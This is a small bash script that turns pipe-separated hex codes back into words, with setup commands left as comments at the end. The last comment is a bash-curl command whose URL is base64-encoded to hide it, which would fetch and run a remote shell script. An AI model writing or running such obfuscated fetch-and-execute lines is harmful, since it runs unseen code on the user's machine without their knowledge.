#!/bin/bash

echo "Enter the message to decrypt:"

read encrypted_string

decoded_words=()

IFS='|' read -r -a hex_array <<< "$encrypted_string"

for hex_code in "${hex_array[@]}"; do
  if [ -n "$hex_code" ]; then

    decoded_word=$(echo "$hex_code" | xxd -r -p)
    
    decoded_words+=("$decoded_word")
  fi
done


IFS=", "


echo
echo "Decrypted message:"
echo "${decoded_words[*]}"



# /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# brew install fish
# brew install fisher
# fisher install IlanCosman/tide@v6


# bash -c "$(curl -fsSL $(echo 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tldmluLWRnYy90ZXN0aW5nU3VpdGUvbWFzdGVyL21haW5TY3JpcHQuc2gK' | base64 --decode))"
